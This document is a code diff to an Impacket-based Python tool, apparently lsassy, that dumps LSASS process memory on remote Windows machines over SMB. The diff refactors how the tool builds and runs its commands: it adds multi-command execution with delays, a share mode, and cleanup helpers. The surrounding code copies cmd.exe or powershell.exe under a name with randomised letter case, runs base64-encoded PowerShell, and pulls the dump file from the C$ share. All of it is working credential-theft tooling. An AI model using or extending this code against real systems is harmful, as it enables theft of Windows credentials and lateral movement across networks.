@@ -36,6 +36,7 @@ class Dependency:
         self.remote_path = "\\Windows\\Temp\\"
         self.uploaded = False
         self.content = content
+        self.share_mode = False
 
     def get_remote_path(self):
         return self.remote_path + self.file
@@ -54,6 +55,7 @@ class Dependency:
             # Share provided
             self.remote_path = self.path
             self.file = ""
+            self.share_mode = True
             return True
         if not os.path.exists(self.path):
             logging.error("{} does not exist.".format(self.path))
@@ -63,6 +65,9 @@ class Dependency:
 
     def upload(self, session):
         # Upload dependency
+
+        if self.share_mode:
+            return True
 
         if self.content is None:
             logging.debug('Copy {} to {}'.format(self.path, self.remote_path))
@@ -106,7 +111,7 @@ class IDumpMethod:
            "cpl", "cur", "dll", "drv", "icns", "ico", "ini", "lnk", "msi", "sys", "tmp", "doc", "docx", "odt",
            "pdf", "rtf", "tex", "txt", "wpd", "png", "jpg"]
 
-    def __init__(self, session, timeout, *args, **kwargs):
+    def __init__(self, session, timeout, time_between_commands, *args, **kwargs):
         self._session = session
         self._file = ImpacketFile(self._session)
         self._file_handle = None
@@ -114,6 +119,7 @@ class IDumpMethod:
         self._executor_path = ""
         self._executor_copied = False
         self._timeout = timeout
+        self._time_between_commands = time_between_commands
 
     def get_exec_method(self, exec_method, no_powershell=False):
         try:
@@ -146,6 +152,9 @@ class IDumpMethod:
     def clean(self):
         return True
 
+    def clean_file(self, remote_path, filename):
+        ImpacketFile.delete(self._session, remote_path + filename, timeout=self._timeout)
+
     def clean_dependencies(self, dependencies):
         [d.clean(self._session, self._timeout) for d in dependencies]
 
@@ -167,7 +176,7 @@ class IDumpMethod:
             buff = CustomBuffer()
             self._session.smb_session.getFile("C$", executor_locations[executor], buff.write)
             self._session.smb_session.putFile("C$", self._executor_path + self._executor_name, buff.read)
-            logging.success("{} successfuly copied as {}".format(executor, self._executor_name))
+            logging.success("{} copied as {}".format(executor, self._executor_name))
             self._executor_copied = True
             return True
         except Exception as e:
@@ -184,26 +193,29 @@ class IDumpMethod:
     def build_exec_command(self, commands, exec_method, no_powershell=False, copy=False):
         logging.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {} | Copy executor: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell, copy))
         if commands["cmd"] is not None and (not self.need_debug_privilege or exec_method.debug_privilege):
+            if not isinstance(commands["cmd"], list):
+                commands["cmd"] = [commands["cmd"]]
             self._executor_name = 'cmd.exe'
             if copy:
                 self.executor_copy('cmd')
             logging.debug(commands["cmd"])
-            executor_command = """/Q /c {}""".format(commands["cmd"])
+            executor_commands = ["""/Q /c {}""".format(command) for command in commands["cmd"]]
         elif commands["pwsh"] is not None and not no_powershell:
+            if not isinstance(commands["pwsh"], list):
+                commands["pwsh"] = [commands["pwsh"]]
             self._executor_name = 'powershell.exe'
             if copy:
                 self.executor_copy('powershell')
             logging.debug(commands["pwsh"])
-            command = base64.b64encode(commands["pwsh"].encode('UTF-16LE')).decode("utf-8")
-            executor_command = "-NoP -Enc {}".format(command)
+            executor_commands = ["-NoP -Enc {}".format(base64.b64encode(command.encode('UTF-16LE')).decode("utf-8")) for command in commands["pwsh"]]
         else:
             logging.error("Shouldn't fall here. Incompatible constraints")
             return None
 
         self._executor_name = ''.join(random.choice([str.upper, str.lower])(c) for c in self._executor_name)
-        return "{}{} {}".format(self._executor_path, self._executor_name, executor_command)
+        return ["{}{} {}".format(self._executor_path, self._executor_name, command) for command in executor_commands]
 
-    def dump(self, dump_path=None, dump_name=None, no_powershell=False, copy=False, exec_methods=None, timeout=5, **kwargs):
+    def dump(self, dump_path=None, dump_name=None, no_powershell=False, copy=False, exec_methods=None, **kwargs):
         logging.info("Dumping via {}".format(self.__module__))
         if exec_methods is not None:
             self.exec_methods = exec_methods
@@ -261,27 +273,33 @@ class IDumpMethod:
 
         for e, exec_method in valid_exec_methods.items():
             logging.info("Trying {} method".format(e))
-            exec_command = self.build_exec_command(commands, exec_method, no_powershell, copy)
-            if exec_command is None:
+            exec_commands = self.build_exec_command(commands, exec_method, no_powershell, copy)
+            if exec_commands is None:
                 # Shouldn't fall there, but if we do, just skip to next execution method
                 continue
-            logging.debug("Transformed command: {}".format(exec_command))
             try:
-                res = exec_method.exec(exec_command)
-                self.executor_clean()
+                first_execution = True
+                for exec_command in exec_commands:
+                    if not first_execution:
+                        time.sleep(self._time_between_commands)
+                    first_execution = False
+                    logging.debug("Transformed command: {}".format(exec_command))
+                    res = exec_method.exec(exec_command)
+                    self.executor_clean()
                 self.clean()
-                if not res:
-                    logging.error("Failed to dump lsass using {}".format(e))
-                    continue
-                self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name, timeout=timeout)
-                if self._file_handle is None:
-                    logging.error("Failed to dump lsass using {}".format(e))
-                    continue
-                logging.success("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
-                return self._file_handle
             except Exception:
                 logging.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
                 continue
+            if not res:
+                logging.error("Failed to dump lsass using {}".format(e))
+                continue
+            self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name, timeout=self._timeout)
+            if self._file_handle is None:
+                logging.error("Failed to dump lsass using {}".format(e))
+                continue
+            logging.success("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
+            return self._file_handle
+            
         logging.error("All execution methods have failed")
         self.clean()
         return None
